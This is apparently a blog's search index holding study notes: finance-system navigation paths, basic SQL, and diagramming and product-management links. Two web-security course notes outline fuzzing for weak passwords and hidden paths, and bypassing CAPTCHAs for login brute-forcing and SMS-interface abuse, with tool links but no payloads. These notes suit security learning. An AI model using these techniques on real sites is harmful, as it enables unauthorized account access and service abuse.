<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TELD-笔记3</title>
      <link href="/2024/09/10/TELD-%E7%AC%94%E8%AE%B03/"/>
      <url>/2024/09/10/TELD-%E7%AC%94%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<h2 id="知识框架："><a href="#知识框架：" class="headerlink" title="知识框架："></a>知识框架：</h2><ul><li>1、财务会计</li><li>2、财务共享及预算</li><li>3、管理会计</li><li>4、UML</li></ul><h3 id="财务共享及预算："><a href="#财务共享及预算：" class="headerlink" title="财务共享及预算："></a>财务共享及预算：</h3><ul><li><p>1.预算管理：<br>（1）预算汇总<br>全面预算-预算编制-【编制预算-编制方案、编制活动-确定-（编写白框-保存并计算-检查-审核-提交审批）&#x2F;（导出excel-导入excel）&#x2F;（归口预算&#x2F;保存并计算-审核）】&#x2F;【预算汇总-编制预算上级组织-费用预算表-汇总】&#x2F;【报表汇总-汇总- 编制预算-审核-提交审批】<br>特来电应用-任务中心-我的待办-预算审批单据-审批<br>（2）预算调整<br>全面预算-执行分析-【预算调整申请-新增调整单-调整表-打开-保存并计算-计算受影响-送审】&#x2F;【预算调整汇总-汇总】&#x2F;【归口预算调整-新增调整单-保存-调整表-预算组织打开-修改-保存并计算】<br>（3）完成数据<br>全面预算-执行分析-完成分析-数据预算表<br>（4）报账<br>财务共享-网上报账平台-我要报账-新建单据-对私通用费用报销单-保存-预算查询-提交</p></li><li><p>2.业务招待费：<br>财务共享-网上报账平台-我要报账–新建单据-对私费用-业务招待费报销单-填写-保存-提交</p></li><li><p>3.保证金转费用：<br>财务共享-网上报账平台-我要报账–新建单据-对公费用-保证金转费用报销单-电子影像-识别</p></li><li><p>4.借款单：<br>财务共享-网上报账平台-我要报账–新建单据-借还款-借款单-填写&#x2F;【电子影像-非发票上传】-保存-提交</p></li><li><p>5.值标控制方案定义和分配：<br>全面预算-执行分析-【值标控制方案定义-新增方案-批量新增行】&#x2F;【值标控制方案分配-新增-新增记录-保存】</p></li><li><p>6.对公付款：<br>财务共享-网上报账平台-我要报账–新建单据-对公费用-对公付款单-电子影像-关联对公费用报销单-保存-提交</p></li><li><p>7.对公费用报销：<br>财务共享-网上报账平台-我要报账–新建单据-对公费用-对公费用报销单-电子影像-关联对公预付款单-保存-提交</p></li><li><p>8.对公预付款：<br>财务共享-网上报账平台-我要报账–新建单据-对公费用-对公预付款单-电子影像-保存-提交</p></li><li><p>9.对私通用报销单：<br>财务共享-网上报账平台-我要报账–新建单据-对私费用-对私费用报销单-电子影像-借款核销-增加关联借款单-保存-提交</p></li><li><p>10.工资付款单：<br>财务共享-网上报账平台-我要报账-新建单据-总账、薪酬类-工资付款单-电子影像-获取SAP数据-保存-提交</p></li><li><p>11.工资预提单：<br>财务共享-网上报账平台-我要报账-新建单据-总账、薪酬类-工资预提单-获取SAO数据&#x2F;新增-保存-提交</p></li><li><p>12：工资预算占用：<br>财务共享-网上报账平台-我要报账-新建单据-总账、薪酬类-工资付款单-获取SAP数据-工资付款审批表&#x2F;预算占用&#x2F;支付信息-保存-提交</p></li><li><p>13.差旅费：<br>财务共享-网上报账平台-我要报账-新建单据-对私费用-差旅费报销单-电子影像-填写-出差明细&#x2F;预算占用 &#x2F;支付信息&#x2F;关联出差申请单&#x2F;关联借款申请单&#x2F;发票信息-保存-提交</p></li><li><p>14.市内交通费：<br>财务共享-网上报账平台-我要报账-新建单据-对私费用-市内交通费报销单-电子影像&#x2F;费用明细&#x2F;预算占用&#x2F;支付信息-保存-提交</p></li><li><p>15.应付付款单推送资金系统：<br>财务会计-应付管理-付款单申请-核算组织-新增预付付款单-保存<br>财务共享-网上报账平台-我要报账-预付付款单-提交<br>财务共享-资金结算平台-单位结算确认-无直联回单确认-再去生成凭证</p></li><li><p>16.总额追加：<br>全面预算-执行分析-单位总额追加申请-新增-保存-提交</p></li><li><p>17.招待费用：<br>财务共享-网上报账平台-我要报账-新建单据-对私通用费用报销单-电子影像-识别-报销说明：报销招待费用-费用明细&#x2F;预算占用&#x2F;支付信息&#x2F;借款核销-保存-提交</p></li><li><p>18.社保公积金：<br>财务共享-网上报账平台-我要报账-新建单据-总账、薪酬类-社保公积金付款-电子影像-【费用分摊部门-下载模板-导入模板】&#x2F;【费用分摊业务线-增加&#x2F;导入明细-下载模板导入模板】&#x2F;支付信息-保存-提交</p></li><li><p>19.职工团建费：<br>财务共享-网上报账平台-我要报账-新建单据-对私费用-职工团建费用报销单-填写-保存-提交</p></li><li><p>20.费用预提冲销：<br>财务共享-网上报账平台-我要报账-新建单据-总账、薪酬类-费用预提单-填写-预算占用&#x2F;申请单&#x2F;【报销明细-增加】-保存-提交</p></li><li><p>21.费用预提单：<br>财务共享-网上报账平台-我要报账-新建单据-总账、薪酬类-费用预提单-填写-保存-提交</p></li><li><p>22.长期待摊费用：<br>财务共享-网上报账平台-我要报账-新建单据-对公费用-长期待摊费用报销单-填写-预算占用-保存-提交-</p></li><li><p>23.预算总额控制：<br>全面预算-执行分析-单位预算通知配置-新增-保存-单位预算总额配置-新增-保存-下达通知</p></li><li><p>24.预算追加申请单：<br>全面预算-执行分析-预算追加单-新增追加单-保存-费用预算表-打开-修改追加-保存并计算-关闭-计算受影响-送审</p></li></ul><h3 id="财务会计："><a href="#财务会计：" class="headerlink" title="财务会计："></a>财务会计：</h3><ul><li><p>1.销售管理：<br>GS-供应链-销售管理-销售发票记账<br>GS-财务会计-会计平台-单据生成-销售管理-销售发票-生成凭证<br>GS-供应链-销售管理-销售成本结转-全选-自动结转-销售月结-月结</p></li><li><p>2.采购管理：<br>GS-供应链-采购管理-采购发票管理&#x2F;采购发票记账</p></li><li><p>3.库存管理：<br>出库成本确认-出库成本计算<br>金额调整单-金额调整审核-审核（单据生成-供应链-库存管理-采购入库-库存暂估收货&#x2F;存货暂估差额）</p></li><li><p>4.存货结算：<br>财务会计-存货核算（web）-入库成本确认（web）&#x2F;入库成本记账（web）&#x2F;出库成本记账（web）&#x2F;供应链月结（web）</p></li><li><p>5.应付管理：<br>待付款清单-审核-单据生成-财务会计-应付管理-采购付款<br>待付款清单-审核-应付生成凭证<br>应付月结处理<br>应付期间维护-凭证撤销操作</p></li><li><p>7.分包结算：<br>web-特来电应用-分包结算管理-分包结算登记（完成状态）-会计平台-单据生成-采购管理-分包结算&#x2F;分包发票（审核状态 ）&#x2F;分包付款 &#x2F;【施工付款-特来电应用-分包结算管理-分包付款申请】</p></li><li><p>8.递延：<br>web-特来电应用-合同管理-【出租合同登记-查看-发票计划-GS-单据生成-供应链-销售管理-递延合同-凭证生成】&#x2F;【电站服务合同登记 -发票计划-GS-单据生成-供应链-销售管理-租赁递延-资产租赁-生成凭证】</p></li><li><p>9.固定资产转资：<br>GS-财务会计-固定资产-【资产增加（投建）-增加】&#x2F;【资产减少-新增】&#x2F;【资产变更-新增-同步变更 】&#x2F;资产确认&#x2F;减少确认&#x2F;变更确认&#x2F;计提折旧&#x2F;折旧分摊&#x2F;月结&#x2F;减值清单定义&#x2F;【减值准备-计算市值】&#x2F;生成凭证（资产减少）<br>GS- 财务会计-会计平台-单据生成-供应链-库存管理-资产折旧-固定资产折旧&#x2F;无形资产折旧&#x2F;运营电站转资<br>GS-财务会计-固定资产-资产明细余额表&#x2F;资产折旧表<br> web-财务会计-固定资产-【投扩建转资申请-新增-获取数据-保存-提交审核-投扩建转资稽核-稽核-生成固定资产-资产确认】&#x2F;固定资产拆解申请&#x2F;外采固定资产验收</p></li><li><p>10.会计平台：<br>GS-财务会计-会计平台-单据生成-</p></li><li><p>11.基础报表：<br>GS-信息披露-统计报表-报表填报- 本表审核-锁定本表<br>GS-财务会计-总账-科目余额表</p></li><li><p>12.凭证导入：<br>GS-财务会计-总账-凭证-引入-下载模板 </p></li><li><p>13.往来模板：<br>GS-财务会计-往来-核销依据定义-导入核销科目<br>GS-财务会计-往来-核销依据定义-往来单据初始-读入月初余额<br>GS-财务会计-往来-核销依据定义-往来核销启用-往来业务核销-批量转入-顺势全额核销-自动核销<br>GS-财务会计-往来-核销依据定义-往来核销记录封存<br>GS-财务会计-往来-期间坏账比率分析&#x2F;期间坏账分析</p></li><li><p>14.固定资产初始余额导入：<br>GS-财务会计-固定资产-资产卡片维护-【下载模板-导入】&#x2F;增加-界面布局-保存-初始完成</p></li><li><p>15.应收单、应付单初期数据导入：<br>GS-财务会计-应收管理-应收单据导入-下载模板&#x2F;导入-应收帐户初始-应收初始完成-确定（单据状态：制单→初始完成）<br>GS-财务会计-应付管理-应付单据导入-下载模板&#x2F;导入-应付帐户初始-应付初始完成-确定</p></li><li><p>16.总账科目余额初始导入：<br>GS-财务会计-总账-余额初始-增加辅助&#x2F;导出&#x2F;导入-往来单位-金额-保存</p></li></ul><h3 id="财务会计思维导图："><a href="#财务会计思维导图：" class="headerlink" title="财务会计思维导图："></a>财务会计思维导图：</h3><p><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B03/%E8%B4%A2%E5%8A%A1%E4%BC%9A%E8%AE%A1.jpg" alt="财务会计"></p><h3 id="SQL学习笔记："><a href="#SQL学习笔记：" class="headerlink" title="SQL学习笔记："></a>SQL学习笔记：</h3><ul><li><p>1.SELECT 语句用于从数据库中选取数据<br>SELECT * FROM Websites;<br>SELECT name,country FROM Websites;  </p></li><li><p>2.SELECT DISTINCT 语句用于返回唯一不同的值<br>SELECT DISTINCT country FROM Websites;  </p></li><li><p>3.WHERE 子句用于提取那些满足指定条件的记录<br>SELECT * FROM Websites WHERE country&#x3D;’CN’;<br>SELECT * FROM Websites WHERE id&#x3D;1;  </p></li><li><p>4.AND &amp; OR 运算符用于基于一个以上的条件对记录进行过滤<br>SELECT * FROM Websites WHERE country&#x3D;’USA’ OR country&#x3D;’CN’;<br>SELECT * FROM Websites WHERE alexa &gt; 15 AND (country&#x3D;’CN’ OR country&#x3D;’USA’);  </p></li><li><p>5.ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序<br>SELECT * FROM websites ORDER BY alexa;  </p></li><li><p>6.INSERT INTO 语句用于向表中插入新记录<br>INSERT INTO websites (name,url,alexa,country) VALUES (‘百度’,’<a href="https://www.baidu.com/','4','CN">https://www.baidu.com/&#39;,&#39;4&#39;,&#39;CN</a>‘);  </p></li><li><p>7.UPDATE 语句用于更新表中已存在的记录<br>UPDATE websites SET alexa&#x3D;’5000’,country&#x3D;’USA’ WHERE name&#x3D;’菜鸟教程’;  </p></li><li><p>8.DELETE 语句用于删除表中的记录<br>DELETE FROM websites WHERE name&#x3D;’Facebook’ AND country&#x3D;’USA’;  </p></li><li><p>9.SELECT TOP 语句用于在 SQL 中限制返回的结果集中的行数， 它通常用于只需要查询前几行数据的情况，尤其在数据集非常大时，可以显著提高查询性能（MySQL使用limit关键字）<br>SELECT * FROM websites LIMIT 2;  </p></li><li><p>10.LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。LIKE 操作符是 SQL 中用于在 WHERE 子句中进行模糊查询的关键字，它允许我们根据模式匹配来选择数据，通常与 % 和 _ 通配符一起使用。<br>SELECT * FROM websites WHERE name LIKE ‘G%’;  </p></li><li><p>11.通配符<br>%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;替代 0 个或多个字符<br>_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;替代一个字符<br>SELECT * FROM websites WHERE url LIKE ‘%oo%’;  </p></li><li><p>12.IN 操作符允许您在 WHERE 子句中规定多个值<br>SELECT * FROM websites WHERE name IN (‘Google’,’菜鸟教程’);  </p></li><li><p>13.BETWEEN 操作符选取介于两个值之间的数据范围内的值，这些值可以是数值、文本或者日期<br>SELECT * FROM websites WHERE alexa BETWEEN 1 AND 20;<br>SELECT * FROM websites WHERE alexa NOT BETWEEN 1 AND 20;<br>SELECT * FROM Websites WHERE (alexa BETWEEN 1 AND 20) AND country NOT IN (‘USA’, ‘IND’);  </p></li><li><p>14.通过使用 SQL，可以为表名称或列名称指定别名<br>SELECT name AS n,country AS c FROM websites;<br>SELECT name, CONCAT(url, ‘, ‘, alexa, ‘, ‘, country) AS site_info FROM Websites;  </p></li><li><p>15.SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。最常见的 JOIN 类型：SQL INNER JOIN（简单的 JOIN）。 SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。<br>SELECT websites.id,websites.name,access_log.count,access_log.date FROM websites INNER JOIN access_log ON websites.id&#x3D;access_log.site_id;  </p></li><li><p>16.LEFT JOIN 关键字从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL<br>SELECT websites.name,access_log.count,access_log.date FROM websites LEFT JOIN access_log ON websites.id&#x3D;access_log.site_id ORDER BY access_log.count DESC;  </p></li><li><p>17.RIGHT JOIN 关键字从右表（table2）返回所有的行，即使左表（table1）中没有匹配。如果左表中没有匹配，则结果为 NULL。<br>SELECT websites.name,access_log.count,access_log.date FROM websites RIGHT JOIN access_log ON access_log.site_id&#x3D;websites.id ORDER BY access_log.count DESC;  </p></li><li><p>18.SQL UNION 操作符合并两个或多个 SELECT 语句的结果。UNION 操作符用于合并两个或多个 SELECT 语句的结果集。它可以从多个表中选择数据，并将结果集组合成一个结果集。使用 UNION 时，每个 SELECT 语句必须具有相同数量的列，且对应列的数据类型必须相似。<br>SELECT country FROM websites UNION SELECT country FROM apps ORDER BY country;<br>SELECT country FROM websites UNION ALL SELECT country FROM apps ORDER BY country;  </p></li><li><p>19.INSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。目标表中任何已存在的行都不会受影响。<br>INSERT INTO websites (name,country) SELECT app_name,country FROM apps;</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 需求分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TELD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TELD-笔记2</title>
      <link href="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/"/>
      <url>/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h2 id="知识框架："><a href="#知识框架：" class="headerlink" title="知识框架："></a>知识框架：</h2><ul><li>1、流程图、时序图、甘特图等</li><li>2、Process On</li><li>3、工具使用</li><li>4、UML</li></ul><h3 id="各种图及工具教程链接："><a href="#各种图及工具教程链接：" class="headerlink" title="各种图及工具教程链接："></a>各种图及工具教程链接：</h3><ul><li>1、脑图：<a href="https://www.bilibili.com/video/BV1Z5411n7ot?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1Z5411n7ot?spm_id_from=333.337.search-card.all.click</a></li><li>2、流程图：<a href="https://www.bilibili.com/video/BV1wx411Z7f2?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1wx411Z7f2?spm_id_from=333.999.0.0</a></li><li>3、时序图：<a href="https://www.bilibili.com/video/BV1NJ411n7G3/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1NJ411n7G3/?spm_id_from=333.337.search-card.all.click</a></li><li>4、ProcessOn：<br><a href="https://www.bilibili.com/video/BV1bQ4y1k7hz?p=2&spm_id_from=pageDriver">https://www.bilibili.com/video/BV1bQ4y1k7hz?p=2&amp;spm_id_from=pageDriver</a><br><a href="https://www.bilibili.com/video/BV1Ne411x7T3?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1Ne411x7T3?spm_id_from=333.337.search-card.all.click</a></li><li>5、Axure：<a href="https://www.bilibili.com/video/BV1eA41157sk?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1eA41157sk?spm_id_from=333.337.search-card.all.click</a></li><li>6、摹客：<a href="https://space.bilibili.com/318033839/channel/series">https://space.bilibili.com/318033839/channel/series</a></li><li>7.UML：<a href="https://www.bilibili.com/video/BV1fq4y1q7KP?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1fq4y1q7KP?spm_id_from=333.337.search-card.all.click</a></li></ul><h3 id="学习结果示例："><a href="#学习结果示例：" class="headerlink" title="学习结果示例："></a>学习结果示例：</h3><h4 id="Office："><a href="#Office：" class="headerlink" title="Office："></a>Office：</h4><p><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/%E7%94%98%E7%89%B9%E5%9B%BE.png" alt="Excel-甘特图"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/PPT%E9%A1%B5%E9%9D%A2%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="PPT-业务流程图"></p><h4 id="Axure："><a href="#Axure：" class="headerlink" title="Axure："></a>Axure：</h4><p><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="Axure-业务流程图"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/%E9%A1%B5%E9%9D%A2%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="Axure-页面流程图"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/QQ.png" alt="QQ"></p><h4 id="Visio："><a href="#Visio：" class="headerlink" title="Visio："></a>Visio：</h4><p><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/%E6%97%B6%E5%BA%8F%E5%9B%BE.png" alt="Visio-时序图"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/%E6%B3%B3%E9%81%93%E5%9B%BE.png" alt="Visio-泳道图"></p><h4 id="摹客："><a href="#摹客：" class="headerlink" title="摹客："></a>摹客：</h4><p><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/%E6%91%B9%E5%AE%A21.png" alt="摹客1"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/%E6%91%B9%E5%AE%A22.png" alt="摹客2"></p><h4 id="EA："><a href="#EA：" class="headerlink" title="EA："></a>EA：</h4><p><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/EA-%E7%B1%BB%E5%9B%BE.png" alt="EA-类图"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/EA-%E7%94%A8%E4%BE%8B%E5%9B%BE.png" alt="EA-用例图"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/EA-%E6%97%B6%E5%BA%8F%E5%9B%BE.png" alt="EA-时序图"></p><h3 id="UML："><a href="#UML：" class="headerlink" title="UML："></a>UML：</h3><p><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B02/UML.jp" alt="UML"></p>]]></content>
      
      
      <categories>
          
          <category> 需求分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TELD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TELD-笔记1</title>
      <link href="/2024/09/10/TELD-%E7%AC%94%E8%AE%B01/"/>
      <url>/2024/09/10/TELD-%E7%AC%94%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<h2 id="知识框架："><a href="#知识框架：" class="headerlink" title="知识框架："></a>知识框架：</h2><ul><li>1、相关书籍《产品经理修炼之道》</li><li>2、相关书籍《人人都是产品经理》</li></ul><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><h3 id="《产品经理修炼之道》"><a href="#《产品经理修炼之道》" class="headerlink" title="《产品经理修炼之道》"></a>《产品经理修炼之道》</h3><p><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B01/%E4%BA%A7%E5%93%81%E7%BB%8F%E7%90%86%E4%BF%AE%E7%82%BC%E4%B9%8B%E9%81%93.jpg" alt="产品经理修炼之道"></p><h3 id="《人人都是产品经理》"><a href="#《人人都是产品经理》" class="headerlink" title="《人人都是产品经理》"></a>《人人都是产品经理》</h3><p><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B01/1%E3%80%81%E5%86%99%E7%BB%99-1%E5%88%B03%E5%B2%81%E7%9A%84%E4%BA%A7%E5%93%81%E7%BB%8F%E7%90%86.jpg" alt="1、写给-1到3岁的产品经理"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B01/2%E3%80%81%E4%B8%80%E4%B8%AA%E9%9C%80%E6%B1%82%E7%9A%84%E5%A5%8B%E6%96%97%E5%8F%B2.jpg" alt="2、一个需求的奋斗史"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B01/3%E3%80%81%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%9D%8E%E5%9D%B7%E4%B8%80%E7%94%9F.jpg" alt="3、项目的坎坷一生"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B01/4%E3%80%81%E6%88%91%E7%9A%84%E4%BA%A7%E5%93%81%EF%BC%8C%E6%88%91%E7%9A%84%E5%9B%A2%E9%98%9F.jpg" alt="4、我的产品，我的团队"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B01/5%E3%80%81%E5%88%AB%E8%AE%A9%E7%81%B5%E9%AD%82%E8%B7%9F%E4%B8%8D%E4%B8%8A%E8%84%9A%E6%AD%A5.jpg" alt="5、别让灵魂跟不上脚步"><br><img src="/2024/09/10/TELD-%E7%AC%94%E8%AE%B01/6%E3%80%81%E4%BA%A7%E5%93%81%E7%BB%8F%E7%90%86%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB.jpg" alt="6、产品经理的自我修养"></p>]]></content>
      
      
      <categories>
          
          <category> 需求分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TELD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>76WEB攻防-Fuzz模糊测试</title>
      <link href="/2023/12/18/76WEB%E6%94%BB%E9%98%B2-Fuzz%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/12/18/76WEB%E6%94%BB%E9%98%B2-Fuzz%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>104、Fuzz技术应用-用户口令(弱口令)</li><li>105、Fuzz技术应用-目录文件(泄漏点)</li><li>106、Fuzz技术应用-未知参数(利用参数)</li><li>107、Fuzz技术应用-Payload(Bypass)</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><h2 id="1、Fuzz"><a href="#1、Fuzz" class="headerlink" title="1、Fuzz"></a>1、Fuzz</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;是一种基于黑盒的自动化软件模糊测试技术,简单的说一种懒惰且暴力的技术融合了常见的以及精心构建的数据文本进行网站、软件安全性测试。</p><h2 id="2、Fuzz的核心思想"><a href="#2、Fuzz的核心思想" class="headerlink" title="2、Fuzz的核心思想:"></a>2、Fuzz的核心思想:</h2><p>口令Fuzz(弱口令)<br>目录Fuzz(漏洞点)<br>参数Fuzz(利用参数)<br>PayloadFuzz(Bypass)</p><p>3、Fuzz应用场景：<br>-爆破用户口令<br>-爆破敏感目录<br>-爆破文件地址<br>-爆破未知参数名<br>-Payload测漏洞（绕过等也可以用）<br>在实战黑盒中，目标有很多没有显示或其他工具扫描不到的文件或目录等，我们就可以通过大量的字典Fuzz找到的隐藏的文件进行测试。</p><p>4、Fuzz项目：<br><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a><br><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p><p>#Fuzz技术-用户口令-常规&amp;模块&amp;JS插件<br><a href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a><br><a href="https://github.com/whwlsfb/BurpCrypto">https://github.com/whwlsfb/BurpCrypto</a></p><p>#Fuzz技术-目录文件-目录探针&amp;文件探针<br>#Fuzz技术-未知参数名-文件参数&amp;隐藏参数<br>#Fuzz技术-构造参数值-漏洞攻击恶意Payload</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>75WEB攻防-验证码安全</title>
      <link href="/2023/12/18/75WEB%E6%94%BB%E9%98%B2-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8/"/>
      <url>/2023/12/18/75WEB%E6%94%BB%E9%98%B2-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>100、验证码简单机制-验证码过于简单可爆破</li><li>101、验证码重复使用-验证码验证机制可绕过</li><li>102、验证码智能识别-验证码图形码被可识别</li><li>103、验证码接口调用-验证码触发接口可枚举</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><h2 id="验证码识别绕过等技术适用于："><a href="#验证码识别绕过等技术适用于：" class="headerlink" title="验证码识别绕过等技术适用于："></a>验证码识别绕过等技术适用于：</h2><p>口令存在爆破，接口枚举调用，任意用户注册等安全问题<br>1、验证码简单机制-验证码过于简单可爆破<br>2、验证码重复使用-验证码验证机制可绕过<br>3、验证码智能识别-验证码图形码被可识别<br>4、验证码接口调用-验证码触发接口可枚举  </p><h2 id="图片验证码-识别插件-登录爆破-接口枚举"><a href="#图片验证码-识别插件-登录爆破-接口枚举" class="headerlink" title="图片验证码-识别插件-登录爆破&amp;接口枚举"></a>图片验证码-识别插件-登录爆破&amp;接口枚举</h2><p>自带白嫖版：<a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a><br>1、Burp加载插件<br>2、运行监听py文件<br>3、设置插件-验证码地址<br>4、数据包验证码填入参数<br>5、发包线程设置1后开始  </p><p>接口收费版：<a href="https://github.com/smxiazi/xp_CAPTCHA">https://github.com/smxiazi/xp_CAPTCHA</a><br>1、Burp加载插件<br>2、注册接口帐号充值<br>3、设置插件-填入帐号<br>4、数据包验证码填入参数<br>5、发包线程设置1后开始  </p><h2 id="图片验证码-重复使用-某APP短信接口滥用"><a href="#图片验证码-重复使用-某APP短信接口滥用" class="headerlink" title="图片验证码-重复使用-某APP短信接口滥用"></a>图片验证码-重复使用-某APP短信接口滥用</h2><p>删除验证码字段进行绕过或直接使用<br>Token sign 验证码等直接重复使用测试  </p><p>##滑块验证码-宏命令-某Token&amp;Sign&amp;滑块案例<br><a href="https://blog.csdn.net/shuryuu/article/details/104576559">https://blog.csdn.net/shuryuu/article/details/104576559</a><br>同理也可以适用在Token，sign在页面代码中自动获取自动填入后绕过验证  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>74WEB攻防-机制验证</title>
      <link href="/2023/12/15/74WEB%E6%94%BB%E9%98%B2-%E6%9C%BA%E5%88%B6%E9%AA%8C%E8%AF%81/"/>
      <url>/2023/12/15/74WEB%E6%94%BB%E9%98%B2-%E6%9C%BA%E5%88%B6%E9%AA%8C%E8%AF%81/</url>
      
